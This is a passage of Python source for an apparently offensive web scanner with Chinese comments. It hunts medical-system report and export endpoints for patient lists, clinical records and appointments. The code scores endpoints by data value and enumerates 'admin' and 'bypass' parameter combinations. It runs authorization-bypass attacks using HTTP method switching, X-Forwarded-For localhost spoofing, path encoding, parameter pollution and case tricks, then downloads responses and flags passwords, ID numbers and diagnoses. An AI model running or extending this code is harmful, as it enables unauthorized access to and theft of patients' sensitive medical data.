            ('診療記録', 85 if self.detected_tech_stack['country'] == 'jp' else 25),
            ('予約一覧', 75 if self.detected_tech_stack['country'] == 'jp' else 20),
            
            # 中文文件 (优先级: 根据地区调整)
            ('患者列表', 90 if self.detected_tech_stack['country'] == 'cn' else 30),
            ('诊疗记录', 85 if self.detected_tech_stack['country'] == 'cn' else 25),
            ('预约列表', 75 if self.detected_tech_stack['country'] == 'cn' else 20),
        ]
        
        # 按优先级排序
        return sorted(files_with_priority, key=lambda x: x[1], reverse=True)

    async def _check_report_path_smart(self, session, semaphore, path):
        """智能报表路径检查 - 集成噪音过滤"""
        async with semaphore:
            url = urljoin(self.target_url, path)
            self.noise_stats['total_paths_tested'] += 1
            
            try:
                async with session.head(url, timeout=5, allow_redirects=False) as resp:
                    # 智能噪音检测
                    is_noise, noise_reason = self.is_noise_response(resp)
                    if is_noise:
                        self.noise_stats['noise_filtered'] += 1
                        return None
                    
                    if resp.status in [200, 401, 403]:
                        content_type = resp.headers.get('Content-Type', '')
                        content_length = int(resp.headers.get('Content-Length', 0))
                        
                        # 计算价值评分
                        value_score = self._calculate_endpoint_value(path, resp.status, content_type, content_length)
                        
                        if value_score > 30:  # 价值阈值
                            endpoint_info = {
                                'url': url,
                                'path': path,
                                'status': resp.status,
                                'content_type': content_type,
                                'size': content_length,
                                'value_score': value_score,
                                'discovered_method': 'intelligent_path'
                            }
                            
                            # 如果是有数据的响应，获取更多信息
                            if resp.status == 200 and content_length > 500:
                                print(f"       高价值报表: {path} (评分: {value_score})")
                                
                                # 获取内容进行进一步分析
                                async with session.get(url, timeout=15) as get_resp:
                                    # WAF欺骗检测
                                    is_real = await self._validate_response_with_waf(url, get_resp, 'report_data')
                                    if not is_real:
                                        return None  # 跳过WAF伪造的响应
                                    
                                    content = await get_resp.read()
                                    endpoint_info['content_analysis'] = await self._analyze_content_advanced(content, content_type, path)
                                
                            elif resp.status in [401, 403]:
                                print(f"       需认证的报表: {path} (评分: {value_score})")
                                
                            self.noise_stats['valuable_findings'] += 1
                            return endpoint_info
                            
            except Exception:
                return None
        
        return None

    def _calculate_endpoint_value(self, path, status, content_type, content_length):
        """计算端点价值评分"""
        score = 0
        
        # 状态码评分
        if status == 200:
            score += 40
        elif status in [401, 403]:
            score += 30  # 需要认证的可能有价值
        
        # 路径关键词评分
        high_value_keywords = ['export', 'download', 'backup', 'dump', 'patient', 'user', 'admin']
        medium_value_keywords = ['report', 'statistics', 'data', 'api']
        
        path_lower = path.lower()
        for keyword in high_value_keywords:
            if keyword in path_lower:
                score += 20
        for keyword in medium_value_keywords:
            if keyword in path_lower:
                score += 10
        
        # 内容类型评分
        if any(ct in content_type.lower() for ct in ['json', 'csv', 'excel', 'xml']):
            score += 15
        elif 'html' in content_type.lower():
            score += 5
        
        # 内容大小评分
        if content_length > 10000:  # 10KB以上
            score += 20
        elif content_length > 1000:  # 1KB以上
            score += 10
        
        # 特殊路径加分
        if any(special in path_lower for special in ['/_', '/.', '/~', '/admin/', '/management/']):
            score += 15
        
        return score

    async def deep_parameter_enumeration(self):
        """深度参数枚举 - 智能参数组合生成"""
        if not self.export_endpoints:
            return
            
        print("[+]  深度参数枚举...")
        
        ssl_context = ssl.create_default_context(cafile=certifi.where())
        conn = aiohttp.TCPConnector(ssl=ssl_context)
        
        async with aiohttp.ClientSession(connector=conn) as session:
            # 选择最有希望的端点进行深度测试
            high_value_endpoints = [e for e in self.export_endpoints if e.get('value_score', 0) > 50][:5]
            
            for endpoint in high_value_endpoints:
                print(f"     深度枚举: {endpoint['path']}")
                await self._enumerate_endpoint_parameters(session, endpoint)

    async def _enumerate_endpoint_parameters(self, session, endpoint):
        """枚举单个端点的参数"""
        base_url = endpoint['url']
        
        # 生成智能参数组合
        param_combinations = self._generate_intelligent_parameter_combinations()
        
        for i, params in enumerate(param_combinations[:20]):  # 限制测试数量
            # 构造测试URL
            param_str = '&'.join([f"{k}={v}" for k, v in params.items()])
            test_url = f"{base_url}?{param_str}"
            
            try:
                async with session.get(test_url, timeout=20) as resp:
                    # 智能噪音检测
                    is_noise, noise_reason = self.is_noise_response(resp)
                    if is_noise:
                        continue
                    
                    if resp.status == 200:
                        content_length = int(resp.headers.get('Content-Length', 0))
                        content_type = resp.headers.get('Content-Type', '')
                        
                        # 检查是否返回了有价值的数据
                        if content_length > 2000:  # 2KB以上
                            print(f"       参数组合有效: {dict(list(params.items())[:3])}...")
                            print(f"         数据大小: {self.format_size(content_length)}")
                            
                            # 下载并分析内容
                            content = await resp.read()
                            analysis = await self._analyze_content_advanced(content, content_type, endpoint['path'])
                            
                            if analysis.get('has_sensitive_data', False):
                                print(f"         🚨 发现敏感数据!")
                                
                                # 添加到发现列表
                                self.found_reports.append({
                                    'endpoint': test_url,
                                    'params': params,
                                    'content_type': content_type,
                                    'size': content_length,
                                    'analysis': analysis,
                                    'discovery_method': 'deep_parameter_enumeration',
                                    'sensitive_level': analysis.get('sensitive_level', 'medium')
                                })
                                
            except Exception:
                continue

    def _generate_intelligent_parameter_combinations(self):
        """生成智能参数组合"""
        combinations = []
        
        # 1. 时间范围组合（基于当前时间）
        from datetime import datetime, timedelta
        now = datetime.now()
        
        # 生成各种时间范围
        time_ranges = [
            # 当前年度
            {'start_date': f'{now.year}-01-01', 'end_date': f'{now.year}-12-31'},
            {'date_from': f'{now.year}-01-01', 'date_to': f'{now.year}-12-31'},
            
            # 去年数据
            {'start_date': f'{now.year-1}-01-01', 'end_date': f'{now.year-1}-12-31'},
            
            # 最近几个月
            {'start_date': (now - timedelta(days=90)).strftime('%Y-%m-%d'), 'end_date': now.strftime('%Y-%m-%d')},
            
            # 所有历史数据
            {'start_date': '2020-01-01', 'end_date': '2030-12-31'},
            {'from': '0', 'to': '9999999999'},  # 时间戳格式
        ]
        
        # 2. 数据类型和格式组合
        data_formats = [
            {'format': 'json', 'export': 'true'},
            {'format': 'csv', 'download': 'true'},
            {'format': 'xlsx', 'type': 'excel'},
            {'format': 'xml', 'output': 'xml'},
            {'type': 'all', 'full': 'true'},
            {'complete': 'true', 'no_limit': 'true'},
        ]
        
        # 3. 分页和限制组合（使用智能限制）
        base_limit = self.limit_manager.get_api_limit(self.system_size, 'report')
        pagination_combos = [
            {'limit': str(base_limit * 2), 'offset': '0'},
            {'page_size': str(base_limit), 'page': '1'},
            {'per_page': str(base_limit * 3), 'page_num': '1'},
            {'count': str(base_limit * 5), 'start': '0'},
            {'limit': '999999', 'all': 'true'},  # 尝试获取所有数据
        ]
        
        # 4. 医疗系统特定参数（基于检测到的国家）
        medical_params = []
        if self.detected_tech_stack['country'] == 'jp':
            medical_params = [
                {'department': '内科', 'type': 'patient'},
                {'部门': '外科', '形式': '患者一覧'},
                {'doctor': 'all', 'period': '月次'},
            ]
        elif self.detected_tech_stack['country'] == 'cn':
            medical_params = [
                {'department': '内科', 'type': 'patient'},
                {'部门': '外科', '格式': '患者列表'},
                {'doctor': 'all', 'period': '月报'},
            ]
        else:
            medical_params = [
                {'department': 'internal', 'type': 'patient'},
                {'dept': 'surgery', 'format': 'patient_list'},
                {'doctor': 'all', 'period': 'monthly'},
            ]
        
        # 5. 权限绕过参数
        bypass_params = [
            {'admin': 'true', 'force': 'true'},
            {'override': 'true', 'bypass': 'true'},
            {'debug': 'true', 'test': 'true'},
            {'internal': 'true', 'system': 'true'},
            {'access_level': 'admin'},
            {'role': 'administrator'},
        ]
        
        # 组合所有参数类型
        all_param_types = [time_ranges, data_formats, pagination_combos, medical_params, bypass_params]
        
        # 生成各种组合
        for time_params in time_ranges[:3]:  # 限制时间范围数量
            for format_params in data_formats[:3]:  # 限制格式数量
                for page_params in pagination_combos[:2]:  # 限制分页数量
                    combo = {}
                    combo.update(time_params)
                    combo.update(format_params)
                    combo.update(page_params)
                    combinations.append(combo)
        
        # 添加医疗特定组合
        for medical in medical_params:
            for time_params in time_ranges[:2]:
                combo = {}
                combo.update(time_params)
                combo.update(medical)
                combo.update({'format': 'json'})
                combinations.append(combo)
        
        # 添加权限绕过组合
        for bypass in bypass_params:
            combo = {}
            combo.update(bypass)
            combo.update({'format': 'json', 'limit': '1000'})
            combinations.append(combo)
        
        return combinations

    async def _analyze_content_advanced(self, content, content_type, filename):
        """增强内容分析 - 敏感信息检测"""
        analysis = {
            'has_data': False,
            'record_count': 0,
            'data_type': 'unknown',
            'sample_data': None,
            'has_sensitive_data': False,
            'sensitive_level': 'low',
            'sensitive_fields': [],
            'data_value_score': 0
        }
        
        try:
            # JSON格式分析
            if 'json' in content_type or filename.endswith('.json'):
                data = json.loads(content)
                analysis.update(self._analyze_json_content(data))
                
            # CSV格式分析
            elif 'csv' in content_type or filename.endswith('.csv'):
                text = content.decode('utf-8', errors='ignore')
                analysis.update(self._analyze_csv_content(text))
                
            # Excel格式
            elif any(fmt in content_type for fmt in ['excel', 'spreadsheet']) or filename.endswith('.xlsx'):
                analysis.update(self._analyze_excel_content(content))
                
            # XML格式
            elif 'xml' in content_type or filename.endswith('.xml'):
                text = content.decode('utf-8', errors='ignore')
                analysis.update(self._analyze_xml_content(text))
                
            # PDF格式
            elif 'pdf' in content_type or filename.endswith('.pdf'):
                analysis.update(self._analyze_pdf_content(content))
                
            # 压缩文件
            elif any(fmt in content_type for fmt in ['zip', 'tar', 'gzip']):
                analysis.update(self._analyze_compressed_content(content))
        
        except Exception as e:
            print(f"      内容分析失败: {e}")
        
        return analysis

    def _analyze_json_content(self, data):
        """分析JSON内容"""
        analysis = {'has_data': False, 'record_count': 0, 'data_type': 'json'}
        
        if isinstance(data, list):
            analysis['has_data'] = len(data) > 0
            analysis['record_count'] = len(data)
            analysis['sample_data'] = data[:3]
            
            # 检查敏感字段
            if data:
                sensitive_info = self._detect_sensitive_fields(data[0] if isinstance(data[0], dict) else {})
                analysis.update(sensitive_info)
                
        elif isinstance(data, dict):
            # 查找数据数组
            data_keys = ['data', 'results', 'records', 'items', 'patients', 'users', 'appointments', 'list']
            for key in data_keys:
                if key in data and isinstance(data[key], list):
                    analysis['has_data'] = len(data[key]) > 0
                    analysis['record_count'] = len(data[key])
                    analysis['sample_data'] = data[key][:3]
                    
                    # 检查敏感字段
                    if data[key] and isinstance(data[key][0], dict):
                        sensitive_info = self._detect_sensitive_fields(data[key][0])
                        analysis.update(sensitive_info)
                    break
                    
            # 检查分页信息
            if 'total' in data:
                analysis['total_records'] = data['total']
        
        return analysis

    def _analyze_csv_content(self, text):
        """分析CSV内容"""
        analysis = {'has_data': False, 'record_count': 0, 'data_type': 'csv'}
        
        lines = text.strip().split('\n')
        if len(lines) > 1:
            analysis['has_data'] = True
            analysis['record_count'] = len(lines) - 1
            
            # 分析字段
            headers = [h.strip().strip('"') for h in lines[0].split(',')]
            analysis['fields'] = headers
            
            # 检查敏感字段
            sensitive_info = self._detect_sensitive_fields_from_headers(headers)
            analysis.update(sensitive_info)
            
            # 分析数据样本
            if len(lines) > 1:
                sample_row = [v.strip().strip('"') for v in lines[1].split(',')]
                analysis['sample_data'] = dict(zip(headers, sample_row))
        
        return analysis

    def _analyze_excel_content(self, content):
        """分析Excel内容"""
        analysis = {
            'has_data': True,
            'data_type': 'excel',
            'file_size': len(content),
            'record_count': 'unknown'
        }
        
        # Excel文件通常很大，简单判断
        if len(content) > 50000:  # 50KB以上
            analysis['data_value_score'] = 80
            analysis['has_sensitive_data'] = True
            analysis['sensitive_level'] = 'high'
            
        return analysis

    def _analyze_xml_content(self, text):
        """分析XML内容"""
        analysis = {'has_data': False, 'record_count': 0, 'data_type': 'xml'}
        
        # 计算记录数
        record_patterns = [r'<(patient|user|record|item|row|entry)[\s>]', r'<(患者|用户|记录)[\s>]']
        total_records = 0
        
        for pattern in record_patterns:
            matches = re.findall(pattern, text, re.I)
            total_records += len(matches)
        
        if total_records > 0:
            analysis['has_data'] = True
            analysis['record_count'] = total_records
            
            # 检查敏感信息
            sensitive_patterns = [
                'password', 'email', 'phone', 'ssn', 'credit', 'bank',
                '密码', '邮箱', '电话', '身份证', '银行卡'
            ]
            
            found_sensitive = []
            for pattern in sensitive_patterns:
                if pattern.lower() in text.lower():
                    found_sensitive.append(pattern)
            
            if found_sensitive:
                analysis['has_sensitive_data'] = True
                analysis['sensitive_fields'] = found_sensitive
                analysis['sensitive_level'] = 'high' if len(found_sensitive) > 2 else 'medium'
        
        return analysis

    def _analyze_pdf_content(self, content):
        """分析PDF内容"""
        return {
            'has_data': True,
            'data_type': 'pdf',
            'file_size': len(content),
            'has_sensitive_data': len(content) > 100000,  # 大PDF可能包含敏感信息
            'sensitive_level': 'medium'
        }

    def _analyze_compressed_content(self, content):
        """分析压缩文件内容"""
        return {
            'has_data': True,
            'data_type': 'compressed',
            'file_size': len(content),
            'has_sensitive_data': True,  # 压缩文件通常包含重要数据
            'sensitive_level': 'high',
            'data_value_score': 90
        }

    def _detect_sensitive_fields(self, record):
        """从记录中检测敏感字段"""
        sensitive_info = {
            'has_sensitive_data': False,
            'sensitive_fields': [],
            'sensitive_level': 'low',
            'data_value_score': 0
        }
        
        if not isinstance(record, dict):
            return sensitive_info
        
        # 定义敏感字段模式
        sensitive_patterns = {
            'high': [
                'password', 'passwd', 'pwd', 'secret', 'token', 'key',
                'ssn', 'social_security', 'credit_card', 'bank_account',
                '密码', '秘钥', '令牌', '身份证', '银行卡', 'パスワード'
            ],
            'medium': [
                'email', 'phone', 'mobile', 'address', 'birth', 'age',
                'salary', 'income', 'medical', 'diagnosis', 'prescription',
                '邮箱', '电话', '手机', '地址', '年龄', '诊断', '处方',
                'メール', '電話', '住所', '年齢', '診断'
            ],
            'low': [
                'name', 'firstname', 'lastname', 'username', 'id',
                '姓名', '用户名', '编号', '氏名', 'ユーザー名'
            ]
        }
        
        found_fields = []
        max_level = 'low'
        
        for field_name in record.keys():
            field_lower = field_name.lower()
            
            # 检查各级别敏感字段
            for level, patterns in sensitive_patterns.items():
                for pattern in patterns:
                    if pattern.lower() in field_lower:
                        found_fields.append(field_name)
                        if level == 'high':
                            max_level = 'high'
                        elif level == 'medium' and max_level != 'high':
                            max_level = 'medium'
                        break
        
        if found_fields:
            sensitive_info['has_sensitive_data'] = True
            sensitive_info['sensitive_fields'] = found_fields
            sensitive_info['sensitive_level'] = max_level
            
            # 计算数据价值评分
            if max_level == 'high':
                sensitive_info['data_value_score'] = 90
            elif max_level == 'medium':
                sensitive_info['data_value_score'] = 70
            else:
                sensitive_info['data_value_score'] = 50
        
        return sensitive_info

    def _detect_sensitive_fields_from_headers(self, headers):
        """从CSV标题检测敏感字段"""
        # 将标题列表转换为字典格式进行检测
        header_dict = {header: f"sample_{i}" for i, header in enumerate(headers)}
        return self._detect_sensitive_fields(header_dict)

    async def discover_hidden_paths(self):
        """隐藏路径发现 - JS分析、历史数据、源码泄露"""
        print("[+] 🕵️ 隐藏路径发现...")
        
        ssl_context = ssl.create_default_context(cafile=certifi.where())
        conn = aiohttp.TCPConnector(ssl=ssl_context)
        
        async with aiohttp.ClientSession(connector=conn) as session:
            discovered_paths = set()
            
            # 1. JS文件分析
            js_paths = await self._analyze_js_files_for_paths(session)
            discovered_paths.update(js_paths)
            
            # 2. HTML注释和源码分析
            html_paths = await self._analyze_html_comments_for_paths(session)
            discovered_paths.update(html_paths)
            
            # 3. robots.txt和sitemap.xml分析
            robots_paths = await self._analyze_robots_and_sitemap(session)
            discovered_paths.update(robots_paths)
            
            # 4. 历史数据分析（Wayback Machine API）
            wayback_paths = await self._analyze_wayback_machine(session)
            discovered_paths.update(wayback_paths)
            
            # 5. 错误页面路径泄露
            error_paths = await self._analyze_error_pages_for_paths(session)
            discovered_paths.update(error_paths)
            
            print(f"     发现 {len(discovered_paths)} 个隐藏路径")
            
            # 测试发现的隐藏路径
            if discovered_paths:
                await self._test_discovered_hidden_paths(session, discovered_paths)

    async def _analyze_js_files_for_paths(self, session):
        """分析JS文件中的路径"""
        print("      分析JS文件...")
        discovered_paths = set()
        
        # 获取主页面的JS文件
        try:
            async with session.get(self.target_url, timeout=15) as resp:
                if resp.status == 200:
                    content = await resp.text()
                    
                    # 提取JS文件路径
                    js_files = re.findall(r'<script[^>]+src=["\']([^"\']+)["\']', content, re.I)
                    js_files.extend(re.findall(r'["\']([^"\']*\.js(?:\?[^"\']*)?)["\']', content))
                    
                    # 分析每个JS文件
                    for js_file in js_files[:10]:  # 限制分析数量
                        if js_file.startswith('http') or js_file.startswith('//'):
                            continue  # 跳过外部JS文件
                            
                        js_url = urljoin(self.target_url, js_file)
                        js_paths = await self._extract_paths_from_js(session, js_url)
                        discovered_paths.update(js_paths)
                        
        except Exception as e:
            print(f"        JS分析失败: {e}")
        
        return discovered_paths

    async def _extract_paths_from_js(self, session, js_url):
        """从单个JS文件提取路径"""
        paths = set()
        
        try:
            async with session.get(js_url, timeout=10) as resp:
                if resp.status == 200:
                    content = await resp.text()
                    
                    # 路径提取模式
                    path_patterns = [
                        # API路径
                        r'["\'](/api/[^"\']+)["\']',
                        r'["\'](/rest/[^"\']+)["\']',
                        r'["\'](/services/[^"\']+)["\']',
                        
                        # 报表路径
                        r'["\'](/reports?/[^"\']+)["\']',
                        r'["\'](/export/[^"\']+)["\']',
                        r'["\'](/download/[^"\']+)["\']',
                        
                        # 管理路径
                        r'["\'](/admin/[^"\']+)["\']',
                        r'["\'](/management/[^"\']+)["\']',
                        r'["\'](/dashboard/[^"\']+)["\']',
                        
                        # GraphQL路径
                        r'["\'](/graphql[^"\']*)["\']',
                        r'["\'](/query[^"\']*)["\']',
                        
                        # 隐藏路径
                        r'["\'](/\.[^"\']+)["\']',
                        r'["\'](/~[^"\']+)["\']',
                        r'["\'](/_[^"\']+)["\']',
                        
                        # 备份和临时路径
                        r'["\'](/backup/[^"\']+)["\']',
                        r'["\'](/temp/[^"\']+)["\']',
                        r'["\'](/tmp/[^"\']+)["\']',
                    ]
                    
                    for pattern in path_patterns:
                        matches = re.findall(pattern, content, re.I)
                        for match in matches:
                            if len(match) > 5 and not any(ext in match for ext in ['.js', '.css', '.png', '.jpg', '.gif']):
                                paths.add(match)
                                
        except Exception:
            pass
        
        return paths

    async def _analyze_html_comments_for_paths(self, session):
        """分析HTML注释中的路径信息"""
        print("      分析HTML注释...")
        discovered_paths = set()
        
        try:
            async with session.get(self.target_url, timeout=15) as resp:
                if resp.status == 200:
                    content = await resp.text()
                    
                    # 提取HTML注释
                    comments = re.findall(r'<!--(.*?)-->', content, re.DOTALL | re.I)
                    
                    for comment in comments:
                        # 在注释中查找路径
                        comment_paths = re.findall(r'(/[a-zA-Z0-9/_.-]+)', comment)
                        for path in comment_paths:
                            if (len(path) > 5 and 
                                any(keyword in path.lower() for keyword in ['api', 'admin', 'report', 'export', 'backup', 'temp']) and
                                not any(ext in path for ext in ['.js', '.css', '.png', '.jpg'])):
                                discovered_paths.add(path)
                                
                        # 查找开发者注释中的信息
                        dev_patterns = [
                            r'TODO[:\s]+.*?(/[a-zA-Z0-9/_.-]+)',
                            r'FIXME[:\s]+.*?(/[a-zA-Z0-9/_.-]+)',
                            r'DEBUG[:\s]+.*?(/[a-zA-Z0-9/_.-]+)',
                            r'TEMP[:\s]+.*?(/[a-zA-Z0-9/_.-]+)',
                        ]
                        
                        for pattern in dev_patterns:
                            matches = re.findall(pattern, comment, re.I)
                            discovered_paths.update(matches)
                            
        except Exception as e:
            print(f"        HTML注释分析失败: {e}")
        
        return discovered_paths

    async def _analyze_robots_and_sitemap(self, session):
        """分析robots.txt和sitemap.xml"""
        print("      分析robots.txt和sitemap...")
        discovered_paths = set()
        
        # 分析robots.txt
        try:
            robots_url = urljoin(self.target_url, '/robots.txt')
            async with session.get(robots_url, timeout=10) as resp:
                if resp.status == 200:
                    content = await resp.text()
                    
                    # 提取Disallow和Allow路径
                    robot_paths = re.findall(r'(?:Disallow|Allow):\s*([^\s]+)', content, re.I)
                    for path in robot_paths:
                        if path != '/' and len(path) > 3:
                            discovered_paths.add(path.rstrip('*'))
                            
        except Exception:
            pass
        
        # 分析sitemap.xml
        sitemap_urls = ['/sitemap.xml', '/sitemap_index.xml', '/sitemap.txt']
        for sitemap_path in sitemap_urls:
            try:
                sitemap_url = urljoin(self.target_url, sitemap_path)
                async with session.get(sitemap_url, timeout=10) as resp:
                    if resp.status == 200:
                        content = await resp.text()
                        
                        # 提取URL路径
                        url_paths = re.findall(r'<loc>([^<]+)</loc>', content, re.I)
                        for url in url_paths:
                            parsed = urlparse(url)
                            if parsed.path and len(parsed.path) > 3:
                                discovered_paths.add(parsed.path)
                                
            except Exception:
                continue
        
        return discovered_paths

    async def _analyze_wayback_machine(self, session):
        """分析Wayback Machine历史数据"""
        print("      分析历史数据...")
        discovered_paths = set()
        
        try:
            # 获取域名
            domain = urlparse(self.target_url).netloc
            
            # Wayback Machine API
            wayback_url = f"http://web.archive.org/cdx/search/cdx?url={domain}/*&output=json&fl=original&collapse=urlkey&limit=100"
            
            async with session.get(wayback_url, timeout=20) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    
                    for entry in data[1:]:  # 跳过标题行
                        if entry and len(entry) > 0:
                            url = entry[0]
                            parsed = urlparse(url)
                            
                            if (parsed.path and len(parsed.path) > 3 and
                                any(keyword in parsed.path.lower() for keyword in 
                                    ['api', 'admin', 'report', 'export', 'backup', 'data', 'download'])):
                                discovered_paths.add(parsed.path)
                                
        except Exception as e:
            print(f"        历史数据分析失败: {e}")
        
        return discovered_paths

    async def _analyze_error_pages_for_paths(self, session):
        """分析错误页面中的路径泄露"""
        print("      分析错误页面...")
        discovered_paths = set()
        
        # 触发各种错误页面
        error_triggers = [
            '/nonexistent_page_12345',
            '/admin/nonexistent',
            '/api/nonexistent',
            '/reports/nonexistent',
            '/%00',
            '/../',
            '/.//',
        ]
        
        for trigger in error_triggers:
            try:
                error_url = urljoin(self.target_url, trigger)
                async with session.get(error_url, timeout=10) as resp:
                    content = await resp.text()
                    
                    # 在错误页面中查找路径泄露
                    error_paths = re.findall(r'(/[a-zA-Z0-9/_.-]+)', content)
                    for path in error_paths:
                        if (len(path) > 5 and 
                            any(keyword in path.lower() for keyword in ['api', 'admin', 'report', 'config', 'backup']) and
                            not any(ext in path for ext in ['.css', '.js', '.png', '.jpg'])):
                            discovered_paths.add(path)
                            
            except Exception:
                continue
        
        return discovered_paths

    async def _test_discovered_hidden_paths(self, session, paths):
        """测试发现的隐藏路径"""
        print("      测试隐藏路径...")
        
        semaphore = asyncio.Semaphore(8)  # 控制并发
        tasks = []
        
        for path in list(paths)[:30]:  # 限制测试数量
            tasks.append(self._test_single_hidden_path(session, semaphore, path))
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # 收集有效发现
        valid_findings = [r for r in results if r is not None and not isinstance(r, Exception)]
        
        if valid_findings:
            print(f"         发现 {len(valid_findings)} 个有效隐藏路径")
            self.export_endpoints.extend(valid_findings)

    async def _test_single_hidden_path(self, session, semaphore, path):
        """测试单个隐藏路径"""
        async with semaphore:
            url = urljoin(self.target_url, path)
            
            try:
                async with session.head(url, timeout=8) as resp:
                    # 噪音检测
                    is_noise, noise_reason = self.is_noise_response(resp)
                    if is_noise:
                        return None
                    
                    if resp.status in [200, 401, 403]:
                        content_type = resp.headers.get('Content-Type', '')
                        content_length = int(resp.headers.get('Content-Length', 0))
                        
                        # 计算价值评分
                        value_score = self._calculate_endpoint_value(path, resp.status, content_type, content_length)
                        
                        if value_score > 35:  # 隐藏路径阈值稍低
                            return {
                                'url': url,
                                'path': path,
                                'status': resp.status,
                                'content_type': content_type,
                                'size': content_length,
                                'value_score': value_score,
                                'discovered_method': 'hidden_path_discovery'
                            }
                            
            except Exception:
                return None
        
        return None

    async def attempt_bypass_techniques(self):
        """权限绕过尝试 - 多种绕过技巧"""
        if not self.export_endpoints:
            return
            
        print("[+]  权限绕过尝试...")
        
        ssl_context = ssl.create_default_context(cafile=certifi.where())
        conn = aiohttp.TCPConnector(ssl=ssl_context)
        
        async with aiohttp.ClientSession(connector=conn) as session:
            # 选择需要认证的端点
            auth_required_endpoints = [e for e in self.export_endpoints if e.get('status') in [401, 403]][:5]
            
            for endpoint in auth_required_endpoints:
                print(f"     绕过尝试: {endpoint['path']}")
                bypass_results = await self._attempt_endpoint_bypass(session, endpoint)
                
                if bypass_results:
                    print(f"       绕过成功!")
                    self.found_reports.extend(bypass_results)

    async def _attempt_endpoint_bypass(self, session, endpoint):
        """尝试绕过单个端点的权限检查"""
        base_url = endpoint['url']
        bypass_results = []
        
        # 1. HTTP方法绕过
        bypass_methods = ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'OPTIONS', 'HEAD']
        for method in bypass_methods:
            try:
                async with session.request(method, base_url, timeout=10) as resp:
                    if resp.status == 200:
                        print(f"         HTTP方法绕过成功: {method}")
                        bypass_results.append({
                            'url': base_url,
                            'method': method,
                            'bypass_type': 'http_method',
                            'status': resp.status
                        })
                        break
            except Exception:
                continue
        
        # 2. 头部绕过
        bypass_headers = [
            {'X-Forwarded-For': '127.0.0.1'},
            {'X-Real-IP': '127.0.0.1'},
            {'X-Originating-IP': '127.0.0.1'},
            {'X-Remote-IP': '127.0.0.1'},
            {'X-Client-IP': '127.0.0.1'},
            {'Client-IP': '127.0.0.1'},
            {'True-Client-IP': '127.0.0.1'},
            {'Cluster-Client-IP': '127.0.0.1'},
            {'X-Forwarded-Host': 'localhost'},
            {'Host': 'localhost'},
            {'Referer': urljoin(base_url, '/admin/')},
            {'X-Custom-IP-Authorization': '127.0.0.1'},
            {'X-Forwarded-For': '192.168.1.1'},
            {'User-Agent': 'Mozilla/5.0 (compatible; internalbot)'},
        ]
        
        for headers in bypass_headers:
            try:
                async with session.get(base_url, headers=headers, timeout=10) as resp:
                    if resp.status == 200:
                        print(f"         头部绕过成功: {list(headers.keys())[0]}")
                        bypass_results.append({
                            'url': base_url,
                            'headers': headers,
                            'bypass_type': 'header_bypass',
                            'status': resp.status
                        })
                        break
            except Exception:
                continue
        
        # 3. 路径绕过技巧
        bypass_paths = [
            base_url + '/',
            base_url + '/.',
            base_url + '/./',
            base_url + '//',
            base_url + '\\',
            base_url + '%20',
            base_url + '%09',
            base_url + '%2e',
            base_url.replace('/', '%2f'),
            base_url.upper(),
            base_url.lower(),
            # URL编码绕过
            base_url.replace('/', '%2F'),
            base_url.replace('=', '%3D'),
            base_url.replace('&', '%26'),
        ]
        
        for bypass_url in bypass_paths:
            try:
                async with session.get(bypass_url, timeout=10) as resp:
                    if resp.status == 200:
                        print(f"         路径绕过成功: {bypass_url}")
                        bypass_results.append({
                            'url': bypass_url,
                            'original_url': base_url,
                            'bypass_type': 'path_manipulation',
                            'status': resp.status
                        })
                        break
            except Exception:
                continue
        
        # 4. 参数污染绕过
        if '?' in base_url:
            base_path, query = base_url.split('?', 1)
            
            pollution_techniques = [
                f"{base_url}&admin=true",
                f"{base_url}&override=true",
                f"{base_url}&bypass=true",
                f"{base_url}&internal=true",
                f"{base_url}&test=true",
                f"{base_url}&debug=true",
                f"{base_url}&force=true",
                f"{base_url}&access_level=admin",
                f"{base_url}&role=administrator",
                f"{base_url}&user=admin",
            ]
            
            for polluted_url in pollution_techniques:
                try:
                    async with session.get(polluted_url, timeout=10) as resp:
                        if resp.status == 200:
                            print(f"         参数污染绕过成功")
                            bypass_results.append({
                                'url': polluted_url,
                                'original_url': base_url,
                                'bypass_type': 'parameter_pollution',
                                'status': resp.status
                            })
                            break
                except Exception:
                    continue
        
        # 5. 大小写变换绕过
        if base_url.count('/') > 3:  # 确保有路径可以变换
            case_variants = [
                base_url.upper(),
                base_url.lower(),
                self._random_case_transform(base_url),
            ]
            
            for variant in case_variants:
                try:
                    async with session.get(variant, timeout=10) as resp:
                        if resp.status == 200:
                            print(f"         大小写绕过成功")
                            bypass_results.append({
                                'url': variant,
                                'original_url': base_url,
                                'bypass_type': 'case_manipulation',
                                'status': resp.status
                            })
                            break
                except Exception:
                    continue
        
        return bypass_results

    def _random_case_transform(self, url):
        """随机大小写变换"""
        import random
        result = ""
        for char in url:
            if char.isalpha():
                result += char.upper() if random.choice([True, False]) else char.lower()
            else:
                result += char
        return result

    async def detect_bi_systems(self):
        """探测BI系统"""
        print("[+] 探测BI系统...")
        
        ssl_context = ssl.create_default_context(cafile=certifi.where())
        conn = aiohttp.TCPConnector(ssl=ssl_context)
        
        async with aiohttp.ClientSession(connector=conn) as session:
            for bi_name, signatures in self.bi_signatures.items():
                for path in signatures['paths']:
                    url = urljoin(self.target_url, path)
                    
                    try:
                        async with session.get(url, timeout=10, allow_redirects=True) as resp:
                            if resp.status in [200, 401, 403]:
                                content = await resp.text()
                                
                                # 检查特征
                                found_signatures = []
                                for sig in signatures['files']:
                                    if sig.lower() in content.lower() or sig.lower() in str(resp.url).lower():
                                        found_signatures.append(sig)
                                        
                                if found_signatures or resp.status in [401, 403]:
                                    print(f"[!] 发现{bi_name}系统: {url}")
                                    self.bi_systems.append({
                                        'name': bi_name,
                                        'url': url,
                                        'status': resp.status,
                                        'signatures': found_signatures
                                    })
                                    
                                    # 如果是401/403，可能需要认证
                                    if resp.status in [401, 403]:
                                        print(f"    需要认证 (状态: {resp.status})")
                                        
                    except Exception as e:  # 注意：需要 import logging
                                        
                        logging.warning(f"异常被忽略: {type(e).__name__}: {str(e)}")
    async def discover_report_endpoints(self):
        """发现报表端点"""
        print("[+] 发现报表端点...")
        
        ssl_context = ssl.create_default_context(cafile=certifi.where())
        conn = aiohttp.TCPConnector(ssl=ssl_context)
        
        async with aiohttp.ClientSession(connector=conn) as session:
            # 测试报表路径
            tasks = []
            
            for path in self.report_paths[0]:  # 数量
                # 测试目录
                tasks.append(self.check_report_path(session, path))
                
                # 测试具体报表文件
                for filename in self.report_files[:20]:
                    for ext in ['.json', '.csv', '.xlsx', '.pdf', '']:
